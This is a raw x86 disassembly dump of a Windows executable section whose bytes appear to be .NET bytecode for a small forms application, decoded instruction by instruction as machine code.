  402a9c:	0a 02                	or     (%edx),%al
  402a9e:	22 00                	and    (%eax),%al
  402aa0:	00 c0                	add    %al,%al
  402aa2:	40                   	inc    %eax
  402aa3:	22 00                	and    (%eax),%al
  402aa5:	00 50 41             	add    %dl,0x41(%eax)
  402aa8:	73 2c                	jae    0x402ad6
  402aaa:	00 00                	add    %al,(%eax)
  402aac:	0a 28                	or     (%eax),%ch
  402aae:	2d 00 00 0a 02       	sub    $0x20a0000,%eax
  402ab3:	17                   	pop    %ss
  402ab4:	28 2e                	sub    %ch,(%esi)
  402ab6:	00 00                	add    %al,(%eax)
  402ab8:	0a 02                	or     (%edx),%al
  402aba:	02 fe                	add    %dh,%bh
  402abc:	06                   	push   %es
  402abd:	2a 00                	sub    (%eax),%al
  402abf:	00 06                	add    %al,(%esi)
  402ac1:	73 64                	jae    0x402b27
  402ac3:	00 00                	add    %al,(%eax)
  402ac5:	0a 28                	or     (%eax),%ch
  402ac7:	65 00 00             	add    %al,%gs:(%eax)
  402aca:	0a 02                	or     (%edx),%al
  402acc:	02 fe                	add    %dh,%bh
  402ace:	06                   	push   %es
  402acf:	2b 00                	sub    (%eax),%eax
  402ad1:	00 06                	add    %al,(%esi)
  402ad3:	73 64                	jae    0x402b39
  402ad5:	00 00                	add    %al,(%eax)
  402ad7:	0a 28                	or     (%eax),%ch
  402ad9:	66 00 00             	data16 add %al,(%eax)
  402adc:	0a 2a                	or     (%edx),%ch
  402ade:	00 00                	add    %al,(%eax)
  402ae0:	03 30                	add    (%eax),%esi
  402ae2:	05 00 2d 01 00       	add    $0x12d00,%eax
  402ae7:	00 00                	add    %al,(%eax)
  402ae9:	00 00                	add    %al,(%eax)
  402aeb:	00 02                	add    %al,(%edx)
  402aed:	7b 27                	jnp    0x402b16
  402aef:	00 00                	add    %al,(%eax)
  402af1:	04 39                	add    $0x39,%al
  402af3:	21 01                	and    %eax,(%ecx)
  402af5:	00 00                	add    %al,(%eax)
  402af7:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402afb:	00 04 04             	add    %al,(%esp,%eax,1)
  402afe:	6f                   	outsl  %ds:(%esi),(%dx)
  402aff:	67 00 00             	add    %al,(%bx,%si)
  402b02:	0a 28                	or     (%eax),%ch
  402b04:	68 00 00 0a 02       	push   $0x20a0000
  402b09:	7c 28                	jl     0x402b33
  402b0b:	00 00                	add    %al,(%eax)
  402b0d:	04 04                	add    $0x4,%al
  402b0f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b10:	69 00 00 0a 04 6f    	imul   $0x6f040a00,(%eax),%eax
  402b16:	6a 00                	push   $0x0
  402b18:	00 0a                	add    %cl,(%edx)
  402b1a:	04 6f                	add    $0x6f,%al
  402b1c:	6b 00 00             	imul   $0x0,(%eax),%eax
  402b1f:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402b22:	6c                   	insb   (%dx),%es:(%edi)
  402b23:	00 00                	add    %al,(%eax)
  402b25:	0a 5f 28             	or     0x28(%edi),%bl
  402b28:	26 00 00             	add    %al,%es:(%eax)
  402b2b:	06                   	push   %es
  402b2c:	16                   	push   %ss
  402b2d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b2e:	6d                   	insl   (%dx),%es:(%edi)
  402b2f:	00 00                	add    %al,(%eax)
  402b31:	0a 28                	or     (%eax),%ch
  402b33:	6e                   	outsb  %ds:(%esi),(%dx)
  402b34:	00 00                	add    %al,(%eax)
  402b36:	0a 02                	or     (%edx),%al
  402b38:	7c 28                	jl     0x402b62
  402b3a:	00 00                	add    %al,(%eax)
  402b3c:	04 16                	add    $0x16,%al
  402b3e:	28 6f 00             	sub    %ch,0x0(%edi)
  402b41:	00 0a                	add    %cl,(%edx)
  402b43:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402b47:	00 04 16             	add    %al,(%esi,%edx,1)
  402b4a:	28 70 00             	sub    %dh,0x0(%eax)
  402b4d:	00 0a                	add    %cl,(%edx)
  402b4f:	04 6f                	add    $0x6f,%al
  402b51:	6b 00 00             	imul   $0x0,(%eax),%eax
  402b54:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402b57:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402b5b:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402b5e:	28 70 00             	sub    %dh,0x0(%eax)
  402b61:	00 0a                	add    %cl,(%edx)
  402b63:	04 6f                	add    $0x6f,%al
  402b65:	6c                   	insb   (%dx),%es:(%edi)
  402b66:	00 00                	add    %al,(%eax)
  402b68:	0a 2c 45 02 7c 28 00 	or     0x287c02(,%eax,2),%ch
  402b6f:	00 04 25 28 71 00 00 	add    %al,0x7128(,%eiz,1)
  402b76:	0a 1f                	or     (%edi),%bl
  402b78:	0c 60                	or     $0x60,%al
  402b7a:	28 70 00             	sub    %dh,0x0(%eax)
  402b7d:	00 0a                	add    %cl,(%edx)
  402b7f:	04 6f                	add    $0x6f,%al
  402b81:	6b 00 00             	imul   $0x0,(%eax),%eax
  402b84:	0a 2d 29 04 6f 67    	or     0x676f0429,%ch
  402b8a:	00 00                	add    %al,(%eax)
  402b8c:	0a 1f                	or     (%edi),%bl
  402b8e:	40                   	inc    %eax
  402b8f:	31 1f                	xor    %ebx,(%edi)
  402b91:	04 6f                	add    $0x6f,%al
  402b93:	67 00 00             	add    %al,(%bx,%si)
  402b96:	0a 1f                	or     (%edi),%bl
  402b98:	60                   	pusha
  402b99:	2f                   	das
  402b9a:	15 02 7c 28 00       	adc    $0x287c02,%eax
  402b9f:	00 04 04             	add    %al,(%esp,%eax,1)
  402ba2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ba3:	67 00 00             	add    %al,(%bx,%si)
  402ba6:	0a 1f                	or     (%edi),%bl
  402ba8:	40                   	inc    %eax
  402ba9:	59                   	pop    %ecx
  402baa:	d1 28                	shrl   $1,(%eax)
  402bac:	6e                   	outsb  %ds:(%esi),(%dx)
  402bad:	00 00                	add    %al,(%eax)
  402baf:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402bb2:	6a 00                	push   $0x0
  402bb4:	00 0a                	add    %cl,(%edx)
  402bb6:	2c 14                	sub    $0x14,%al
  402bb8:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402bbc:	00 04 25 28 71 00 00 	add    %al,0x7128(,%eiz,1)
  402bc3:	0a 1f                	or     (%edi),%bl
  402bc5:	10 60 28             	adc    %ah,0x28(%eax)
  402bc8:	70 00                	jo     0x402bca
  402bca:	00 0a                	add    %cl,(%edx)
  402bcc:	04 6f                	add    $0x6f,%al
  402bce:	72 00                	jb     0x402bd0
  402bd0:	00 0a                	add    %cl,(%edx)
  402bd2:	1f                   	pop    %ds
  402bd3:	14 5f                	adc    $0x5f,%al
  402bd5:	16                   	push   %ss
  402bd6:	31 17                	xor    %edx,(%edi)
  402bd8:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402bdc:	00 04 25 28 71 00 00 	add    %al,0x7128(,%eiz,1)
  402be3:	0a 20                	or     (%eax),%ah
  402be5:	80 00 00             	addb   $0x0,(%eax)
  402be8:	00 60 28             	add    %ah,0x28(%eax)
  402beb:	70 00                	jo     0x402bed
  402bed:	00 0a                	add    %cl,(%edx)
  402bef:	04 6f                	add    $0x6f,%al
  402bf1:	72 00                	jb     0x402bf3
  402bf3:	00 0a                	add    %cl,(%edx)
  402bf5:	20 90 00 00 00 5f    	and    %dl,0x5f000000(%eax)
  402bfb:	16                   	push   %ss
  402bfc:	31 14 02             	xor    %edx,(%edx,%eax,1)
  402bff:	7c 28                	jl     0x402c29
  402c01:	00 00                	add    %al,(%eax)
  402c03:	04 25                	add    $0x25,%al
  402c05:	28 71 00             	sub    %dh,0x0(%ecx)
  402c08:	00 0a                	add    %cl,(%edx)
  402c0a:	1f                   	pop    %ds
  402c0b:	20 60 28             	and    %ah,0x28(%eax)
  402c0e:	70 00                	jo     0x402c10
  402c10:	00 0a                	add    %cl,(%edx)
  402c12:	02 28                	add    (%eax),%ch
  402c14:	19 00                	sbb    %eax,(%eax)
  402c16:	00 0a                	add    %cl,(%edx)
  402c18:	2a 00                	sub    (%eax),%al
  402c1a:	00 00                	add    %al,(%eax)
  402c1c:	03 30                	add    (%eax),%esi
  402c1e:	05 00 2d 01 00       	add    $0x12d00,%eax
  402c23:	00 00                	add    %al,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	00 02                	add    %al,(%edx)
  402c29:	7b 27                	jnp    0x402c52
  402c2b:	00 00                	add    %al,(%eax)
  402c2d:	04 3a                	add    $0x3a,%al
  402c2f:	21 01                	and    %eax,(%ecx)
  402c31:	00 00                	add    %al,(%eax)
  402c33:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402c37:	00 04 04             	add    %al,(%esp,%eax,1)
  402c3a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c3b:	67 00 00             	add    %al,(%bx,%si)
  402c3e:	0a 28                	or     (%eax),%ch
  402c40:	68 00 00 0a 02       	push   $0x20a0000
  402c45:	7c 28                	jl     0x402c6f
  402c47:	00 00                	add    %al,(%eax)
  402c49:	04 04                	add    $0x4,%al
  402c4b:	6f                   	outsl  %ds:(%esi),(%dx)
  402c4c:	69 00 00 0a 04 6f    	imul   $0x6f040a00,(%eax),%eax
  402c52:	6a 00                	push   $0x0
  402c54:	00 0a                	add    %cl,(%edx)
  402c56:	04 6f                	add    $0x6f,%al
  402c58:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c5b:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402c5e:	6c                   	insb   (%dx),%es:(%edi)
  402c5f:	00 00                	add    %al,(%eax)
  402c61:	0a 5f 28             	or     0x28(%edi),%bl
  402c64:	26 00 00             	add    %al,%es:(%eax)
  402c67:	06                   	push   %es
  402c68:	16                   	push   %ss
  402c69:	6f                   	outsl  %ds:(%esi),(%dx)
  402c6a:	6d                   	insl   (%dx),%es:(%edi)
  402c6b:	00 00                	add    %al,(%eax)
  402c6d:	0a 28                	or     (%eax),%ch
  402c6f:	6e                   	outsb  %ds:(%esi),(%dx)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	0a 02                	or     (%edx),%al
  402c74:	7c 28                	jl     0x402c9e
  402c76:	00 00                	add    %al,(%eax)
  402c78:	04 17                	add    $0x17,%al
  402c7a:	28 6f 00             	sub    %ch,0x0(%edi)
  402c7d:	00 0a                	add    %cl,(%edx)
  402c7f:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402c83:	00 04 16             	add    %al,(%esi,%edx,1)
  402c86:	28 70 00             	sub    %dh,0x0(%eax)
  402c89:	00 0a                	add    %cl,(%edx)
  402c8b:	04 6f                	add    $0x6f,%al
  402c8d:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c90:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402c93:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402c97:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402c9a:	28 70 00             	sub    %dh,0x0(%eax)
  402c9d:	00 0a                	add    %cl,(%edx)
  402c9f:	04 6f                	add    $0x6f,%al
  402ca1:	6c                   	insb   (%dx),%es:(%edi)
  402ca2:	00 00                	add    %al,(%eax)
  402ca4:	0a 2c 45 02 7c 28 00 	or     0x287c02(,%eax,2),%ch
  402cab:	00 04 25 28 71 00 00 	add    %al,0x7128(,%eiz,1)
  402cb2:	0a 1f                	or     (%edi),%bl
  402cb4:	0c 60                	or     $0x60,%al
  402cb6:	28 70 00             	sub    %dh,0x0(%eax)
  402cb9:	00 0a                	add    %cl,(%edx)
  402cbb:	04 6f                	add    $0x6f,%al
  402cbd:	6b 00 00             	imul   $0x0,(%eax),%eax
  402cc0:	0a 2d 29 04 6f 67    	or     0x676f0429,%ch
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	0a 1f                	or     (%edi),%bl
  402cca:	40                   	inc    %eax
  402ccb:	31 1f                	xor    %ebx,(%edi)
  402ccd:	04 6f                	add    $0x6f,%al
  402ccf:	67 00 00             	add    %al,(%bx,%si)
  402cd2:	0a 1f                	or     (%edi),%bl
  402cd4:	60                   	pusha
  402cd5:	2f                   	das
  402cd6:	15 02 7c 28 00       	adc    $0x287c02,%eax
  402cdb:	00 04 04             	add    %al,(%esp,%eax,1)
  402cde:	6f                   	outsl  %ds:(%esi),(%dx)
  402cdf:	67 00 00             	add    %al,(%bx,%si)
  402ce2:	0a 1f                	or     (%edi),%bl
  402ce4:	40                   	inc    %eax
  402ce5:	59                   	pop    %ecx
  402ce6:	d1 28                	shrl   $1,(%eax)
  402ce8:	6e                   	outsb  %ds:(%esi),(%dx)
  402ce9:	00 00                	add    %al,(%eax)
  402ceb:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402cee:	6a 00                	push   $0x0
  402cf0:	00 0a                	add    %cl,(%edx)
  402cf2:	2c 14                	sub    $0x14,%al
  402cf4:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402cf8:	00 04 25 28 71 00 00 	add    %al,0x7128(,%eiz,1)
  402cff:	0a 1f                	or     (%edi),%bl
  402d01:	10 60 28             	adc    %ah,0x28(%eax)
  402d04:	70 00                	jo     0x402d06
  402d06:	00 0a                	add    %cl,(%edx)
  402d08:	04 6f                	add    $0x6f,%al
  402d0a:	72 00                	jb     0x402d0c
  402d0c:	00 0a                	add    %cl,(%edx)
  402d0e:	1f                   	pop    %ds
  402d0f:	14 5f                	adc    $0x5f,%al
  402d11:	16                   	push   %ss
  402d12:	31 17                	xor    %edx,(%edi)
  402d14:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402d18:	00 04 25 28 71 00 00 	add    %al,0x7128(,%eiz,1)
  402d1f:	0a 20                	or     (%eax),%ah
  402d21:	80 00 00             	addb   $0x0,(%eax)
  402d24:	00 60 28             	add    %ah,0x28(%eax)
  402d27:	70 00                	jo     0x402d29
  402d29:	00 0a                	add    %cl,(%edx)
  402d2b:	04 6f                	add    $0x6f,%al
  402d2d:	72 00                	jb     0x402d2f
  402d2f:	00 0a                	add    %cl,(%edx)
  402d31:	20 90 00 00 00 5f    	and    %dl,0x5f000000(%eax)
  402d37:	16                   	push   %ss
  402d38:	31 14 02             	xor    %edx,(%edx,%eax,1)
  402d3b:	7c 28                	jl     0x402d65
  402d3d:	00 00                	add    %al,(%eax)
  402d3f:	04 25                	add    $0x25,%al
  402d41:	28 71 00             	sub    %dh,0x0(%ecx)
  402d44:	00 0a                	add    %cl,(%edx)
  402d46:	1f                   	pop    %ds
  402d47:	20 60 28             	and    %ah,0x28(%eax)
  402d4a:	70 00                	jo     0x402d4c
  402d4c:	00 0a                	add    %cl,(%edx)
  402d4e:	02 28                	add    (%eax),%ch
  402d50:	19 00                	sbb    %eax,(%eax)
  402d52:	00 0a                	add    %cl,(%edx)
  402d54:	2a 00                	sub    (%eax),%al
  402d56:	00 00                	add    %al,(%eax)
  402d58:	13 30                	adc    (%eax),%esi
  402d5a:	01 00                	add    %eax,(%eax)
  402d5c:	da 00                	fiaddl (%eax)
  402d5e:	00 00                	add    %al,(%eax)
  402d60:	09 00                	or     %eax,(%eax)
  402d62:	00 11                	add    %dl,(%ecx)
  402d64:	03 0a                	add    (%edx),%ecx
  402d66:	06                   	push   %es
  402d67:	45                   	inc    %ebp
  402d68:	10 00                	adc    %al,(%eax)
  402d6a:	00 00                	add    %al,(%eax)
  402d6c:	05 00 00 00 17       	add    $0x17000000,%eax
  402d71:	00 00                	add    %al,(%eax)
  402d73:	00 2d 00 00 00 38    	add    %ch,0x38000000
  402d79:	00 00                	add    %al,(%eax)
  402d7b:	00 4e 00             	add    %cl,0x0(%esi)
  402d7e:	00 00                	add    %al,(%eax)
  402d80:	43                   	inc    %ebx
  402d81:	00 00                	add    %al,(%eax)
  402d83:	00 59 00             	add    %bl,0x0(%ecx)
  402d86:	00 00                	add    %al,(%eax)
  402d88:	64 00 00             	add    %al,%fs:(%eax)
  402d8b:	00 22                	add    %ah,(%edx)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	00 0b                	add    %cl,(%ebx)
  402d91:	00 00                	add    %al,(%eax)
  402d93:	00 6f 00             	add    %ch,0x0(%edi)
  402d96:	00 00                	add    %al,(%eax)
  402d98:	11 00                	adc    %eax,(%eax)
  402d9a:	00 00                	add    %al,(%eax)
  402d9c:	80 00 00             	addb   $0x0,(%eax)
  402d9f:	00 7a 00             	add    %bh,0x0(%edx)
  402da2:	00 00                	add    %al,(%eax)
  402da4:	8c 00                	mov    %es,(%eax)
  402da6:	00 00                	add    %al,(%eax)
  402da8:	86 00                	xchg   %al,(%eax)
  402daa:	00 00                	add    %al,(%eax)
  402dac:	38 87 00 00 00 28    	cmp    %al,0x28000000(%edi)
  402db2:	73 00                	jae    0x402db4
  402db4:	00 0a                	add    %cl,(%edx)
  402db6:	2a 28                	sub    (%eax),%ch
  402db8:	74 00                	je     0x402dba
  402dba:	00 0a                	add    %cl,(%edx)
  402dbc:	2a 28                	sub    (%eax),%ch
  402dbe:	75 00                	jne    0x402dc0
  402dc0:	00 0a                	add    %cl,(%edx)
  402dc2:	2a 72 77             	sub    0x77(%edx),%dh
  402dc5:	00 00                	add    %al,(%eax)
  402dc7:	70 28                	jo     0x402df1
  402dc9:	76 00                	jbe    0x402dcb
  402dcb:	00 0a                	add    %cl,(%edx)
  402dcd:	2a 72 87             	sub    -0x79(%edx),%dh
  402dd0:	00 00                	add    %al,(%eax)
  402dd2:	70 28                	jo     0x402dfc
  402dd4:	76 00                	jbe    0x402dd6
  402dd6:	00 0a                	add    %cl,(%edx)
  402dd8:	2a 72 97             	sub    -0x69(%edx),%dh
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	70 28                	jo     0x402e07
  402ddf:	76 00                	jbe    0x402de1
  402de1:	00 0a                	add    %cl,(%edx)
  402de3:	2a 72 a7             	sub    -0x59(%edx),%dh
  402de6:	00 00                	add    %al,(%eax)
  402de8:	70 28                	jo     0x402e12
  402dea:	76 00                	jbe    0x402dec
  402dec:	00 0a                	add    %cl,(%edx)
  402dee:	2a 72 b7             	sub    -0x49(%edx),%dh
  402df1:	00 00                	add    %al,(%eax)
  402df3:	70 28                	jo     0x402e1d
  402df5:	76 00                	jbe    0x402df7
  402df7:	00 0a                	add    %cl,(%edx)
  402df9:	2a 72 c7             	sub    -0x39(%edx),%dh
  402dfc:	00 00                	add    %al,(%eax)
  402dfe:	70 28                	jo     0x402e28
  402e00:	76 00                	jbe    0x402e02
  402e02:	00 0a                	add    %cl,(%edx)
  402e04:	2a 72 d7             	sub    -0x29(%edx),%dh
  402e07:	00 00                	add    %al,(%eax)
  402e09:	70 28                	jo     0x402e33
  402e0b:	76 00                	jbe    0x402e0d
  402e0d:	00 0a                	add    %cl,(%edx)
  402e0f:	2a 72 e7             	sub    -0x19(%edx),%dh
  402e12:	00 00                	add    %al,(%eax)
  402e14:	70 28                	jo     0x402e3e
  402e16:	76 00                	jbe    0x402e18
  402e18:	00 0a                	add    %cl,(%edx)
  402e1a:	2a 72 f7             	sub    -0x9(%edx),%dh
  402e1d:	00 00                	add    %al,(%eax)
  402e1f:	70 28                	jo     0x402e49
  402e21:	76 00                	jbe    0x402e23
  402e23:	00 0a                	add    %cl,(%edx)
  402e25:	2a 28                	sub    (%eax),%ch
  402e27:	77 00                	ja     0x402e29
  402e29:	00 0a                	add    %cl,(%edx)
  402e2b:	2a 28                	sub    (%eax),%ch
  402e2d:	78 00                	js     0x402e2f
  402e2f:	00 0a                	add    %cl,(%edx)
  402e31:	2a 28                	sub    (%eax),%ch
  402e33:	79 00                	jns    0x402e35
  402e35:	00 0a                	add    %cl,(%edx)
  402e37:	2a 28                	sub    (%eax),%ch
  402e39:	7a 00                	jp     0x402e3b
  402e3b:	00 0a                	add    %cl,(%edx)
  402e3d:	2a 00                	sub    (%eax),%al
  402e3f:	00 03                	add    %al,(%ebx)
  402e41:	30 03                	xor    %al,(%ebx)
  402e43:	00 c6                	add    %al,%dh
  402e45:	00 00                	add    %al,(%eax)
  402e47:	00 00                	add    %al,(%eax)
  402e49:	00 00                	add    %al,(%eax)
  402e4b:	00 02                	add    %al,(%edx)
  402e4d:	28 7b 00             	sub    %bh,0x0(%ebx)
  402e50:	00 0a                	add    %cl,(%edx)
  402e52:	02 22                	add    (%edx),%ah
  402e54:	00 00                	add    %al,(%eax)
  402e56:	c0 40 22 00          	rolb   $0x0,0x22(%eax)
  402e5a:	00 50 41             	add    %dl,0x41(%eax)
  402e5d:	73 2c                	jae    0x402e8b
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	0a 28                	or     (%eax),%ch
  402e63:	2d 00 00 0a 02       	sub    $0x20a0000,%eax
  402e68:	17                   	pop    %ss
  402e69:	28 2e                	sub    %ch,(%esi)
  402e6b:	00 00                	add    %al,(%eax)
  402e6d:	0a 02                	or     (%edx),%al
  402e6f:	17                   	pop    %ss
  402e70:	6f                   	outsl  %ds:(%esi),(%dx)
  402e71:	7c 00                	jl     0x402e73
  402e73:	00 0a                	add    %cl,(%edx)
  402e75:	02 28                	add    (%eax),%ch
  402e77:	29 00                	sub    %eax,(%eax)
  402e79:	00 0a                	add    %cl,(%edx)
  402e7b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e7c:	2a 00                	sub    (%eax),%al
  402e7e:	00 0a                	add    %cl,(%edx)
  402e80:	6f                   	outsl  %ds:(%esi),(%dx)
  402e81:	32 00                	xor    (%eax),%al
  402e83:	00 0a                	add    %cl,(%edx)
  402e85:	02 20                	add    (%eax),%ah
  402e87:	93                   	xchg   %eax,%ebx
  402e88:	00 00                	add    %al,(%eax)
  402e8a:	00 28                	add    %ch,(%eax)
  402e8c:	5b                   	pop    %ebx
  402e8d:	00 00                	add    %al,(%eax)
  402e8f:	0a 02                	or     (%edx),%al
  402e91:	20 20                	and    %ah,(%eax)
  402e93:	03 00                	add    (%eax),%eax
  402e95:	00 28                	add    %ch,(%eax)
  402e97:	5c                   	pop    %esp
  402e98:	00 00                	add    %al,(%eax)
  402e9a:	0a 02                	or     (%edx),%al
  402e9c:	28 79 00             	sub    %bh,0x0(%ecx)
  402e9f:	00 0a                	add    %cl,(%edx)
  402ea1:	6f                   	outsl  %ds:(%esi),(%dx)
  402ea2:	7d 00                	jge    0x402ea4
  402ea4:	00 0a                	add    %cl,(%edx)
  402ea6:	02 17                	add    (%edi),%dl
  402ea8:	28 46 00             	sub    %al,0x0(%esi)
  402eab:	00 0a                	add    %cl,(%edx)
  402ead:	02 16                	add    (%esi),%dl
  402eaf:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  402eb3:	0a 02                	or     (%edx),%al
  402eb5:	16                   	push   %ss
  402eb6:	28 4d 00             	sub    %cl,0x0(%ebp)
  402eb9:	00 0a                	add    %cl,(%edx)
  402ebb:	02 16                	add    (%esi),%dl
  402ebd:	28 7e 00             	sub    %bh,0x0(%esi)
  402ec0:	00 0a                	add    %cl,(%edx)
  402ec2:	02 17                	add    (%edi),%dl
  402ec4:	28 47 00             	sub    %al,0x0(%edi)
  402ec7:	00 0a                	add    %cl,(%edx)
  402ec9:	02 28                	add    (%eax),%ch
  402ecb:	7f 00                	jg     0x402ecd
  402ecd:	00 0a                	add    %cl,(%edx)
  402ecf:	02 7b 2a             	add    0x2a(%ebx),%bh
  402ed2:	00 00                	add    %al,(%eax)
  402ed4:	04 02                	add    $0x2,%al
  402ed6:	fe 06                	incb   (%esi)
  402ed8:	2e 00 00             	add    %al,%cs:(%eax)
  402edb:	06                   	push   %es
  402edc:	73 80                	jae    0x402e5e
  402ede:	00 00                	add    %al,(%eax)
  402ee0:	0a 6f 81             	or     -0x7f(%edi),%ch
  402ee3:	00 00                	add    %al,(%eax)
  402ee5:	0a 02                	or     (%edx),%al
  402ee7:	7b 2a                	jnp    0x402f13
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	04 23                	add    $0x23,%al
  402eed:	00 00                	add    %al,(%eax)
  402eef:	00 00                	add    %al,(%eax)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	49                   	dec    %ecx
  402ef4:	40                   	inc    %eax
  402ef5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ef6:	82 00 00             	addb   $0x0,(%eax)
  402ef9:	0a 02                	or     (%edx),%al
  402efb:	7b 2a                	jnp    0x402f27
  402efd:	00 00                	add    %al,(%eax)
  402eff:	04 17                	add    $0x17,%al
  402f01:	6f                   	outsl  %ds:(%esi),(%dx)
  402f02:	83 00 00             	addl   $0x0,(%eax)
  402f05:	0a 02                	or     (%edx),%al
  402f07:	7b 2a                	jnp    0x402f33
  402f09:	00 00                	add    %al,(%eax)
  402f0b:	04 6f                	add    $0x6f,%al
  402f0d:	84 00                	test   %al,(%eax)
  402f0f:	00 0a                	add    %cl,(%edx)
  402f11:	2a 00                	sub    (%eax),%al
  402f13:	00 03                	add    %al,(%ebx)
  402f15:	30 02                	xor    %al,(%edx)
  402f17:	00 6d 00             	add    %ch,0x0(%ebp)
  402f1a:	00 00                	add    %al,(%eax)
  402f1c:	00 00                	add    %al,(%eax)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	02 7b 2d             	add    0x2d(%ebx),%bh
  402f23:	00 00                	add    %al,(%eax)
  402f25:	04 2c                	add    $0x2c,%al
  402f27:	01 2a                	add    %ebp,(%edx)
  402f29:	02 17                	add    (%edi),%dl
  402f2b:	7d 2d                	jge    0x402f5a
  402f2d:	00 00                	add    %al,(%eax)
  402f2f:	04 02                	add    $0x2,%al
  402f31:	7b 2b                	jnp    0x402f5e
  402f33:	00 00                	add    %al,(%eax)
  402f35:	04 16                	add    $0x16,%al
  402f37:	32 4c 02 7b          	xor    0x7b(%edx,%eax,1),%cl
  402f3b:	2c 00                	sub    $0x0,%al
  402f3d:	00 04 16             	add    %al,(%esi,%edx,1)
  402f40:	32 28                	xor    (%eax),%ch
  402f42:	02 7b 2e             	add    0x2e(%ebx),%bh
  402f45:	00 00                	add    %al,(%eax)
  402f47:	04 02                	add    $0x2,%al
  402f49:	7b 2b                	jnp    0x402f76
  402f4b:	00 00                	add    %al,(%eax)
  402f4d:	04 6f                	add    $0x6f,%al
  402f4f:	85 00                	test   %eax,(%eax)
  402f51:	00 0a                	add    %cl,(%edx)
  402f53:	7b 31                	jnp    0x402f86
  402f55:	00 00                	add    %al,(%eax)
  402f57:	04 02                	add    $0x2,%al
  402f59:	7b 2c                	jnp    0x402f87
  402f5b:	00 00                	add    %al,(%eax)
  402f5d:	04 6f                	add    $0x6f,%al
  402f5f:	86 00                	xchg   %al,(%eax)
  402f61:	00 0a                	add    %cl,(%edx)
  402f63:	02 15 7d 2c 00 00    	add    0x2c7d,%dl
  402f69:	04 02                	add    $0x2,%al
  402f6b:	7b 2e                	jnp    0x402f9b
  402f6d:	00 00                	add    %al,(%eax)
  402f6f:	04 02                	add    $0x2,%al
  402f71:	7b 2b                	jnp    0x402f9e
  402f73:	00 00                	add    %al,(%eax)
  402f75:	04 6f                	add    $0x6f,%al
  402f77:	85 00                	test   %eax,(%eax)
  402f79:	00 0a                	add    %cl,(%edx)
  402f7b:	7b 31                	jnp    0x402fae
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	04 6f                	add    $0x6f,%al
  402f81:	87 00                	xchg   %eax,(%eax)
  402f83:	00 0a                	add    %cl,(%edx)
  402f85:	02 16                	add    (%esi),%dl
  402f87:	7d 2d                	jge    0x402fb6
  402f89:	00 00                	add    %al,(%eax)
  402f8b:	04 2a                	add    $0x2a,%al
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	00 03                	add    %al,(%ebx)
  402f91:	30 04 00             	xor    %al,(%eax,%eax,1)
  402f94:	83 02 00             	addl   $0x0,(%edx)
  402f97:	00 00                	add    %al,(%eax)
  402f99:	00 00                	add    %al,(%eax)
  402f9b:	00 03                	add    %al,(%ebx)
  402f9d:	73 2f                	jae    0x402fce
  402f9f:	00 00                	add    %al,(%eax)
  402fa1:	0a 7d 2f             	or     0x2f(%ebp),%bh
  402fa4:	00 00                	add    %al,(%eax)
  402fa6:	04 03                	add    $0x3,%al
  402fa8:	7b 2f                	jnp    0x402fd9
  402faa:	00 00                	add    %al,(%eax)
  402fac:	04 1b                	add    $0x1b,%al
  402fae:	6f                   	outsl  %ds:(%esi),(%dx)
  402faf:	88 00                	mov    %al,(%eax)
  402fb1:	00 0a                	add    %cl,(%edx)
  402fb3:	03 7b 2f             	add    0x2f(%ebx),%edi
  402fb6:	00 00                	add    %al,(%eax)
  402fb8:	04 1f                	add    $0x1f,%al
  402fba:	68 04 5a 1f 0a       	push   $0xa1f5a04
  402fbf:	58                   	pop    %eax
  402fc0:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc1:	89 00                	mov    %eax,(%eax)
  402fc3:	00 0a                	add    %cl,(%edx)
  402fc5:	03 7b 2f             	add    0x2f(%ebx),%edi
  402fc8:	00 00                	add    %al,(%eax)
  402fca:	04 20                	add    $0x20,%al
  402fcc:	0c 03                	or     $0x3,%al
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	6f                   	outsl  %ds:(%esi),(%dx)
  402fd1:	5c                   	pop    %esp
  402fd2:	00 00                	add    %al,(%eax)
  402fd4:	0a 03                	or     (%ebx),%al
  402fd6:	7b 2f                	jnp    0x403007
  402fd8:	00 00                	add    %al,(%eax)
  402fda:	04 1f                	add    $0x1f,%al
  402fdc:	10 6f 5b             	adc    %ch,0x5b(%edi)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	0a 03                	or     (%ebx),%al
  402fe3:	7b 2f                	jnp    0x403014
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	04 03                	add    $0x3,%al
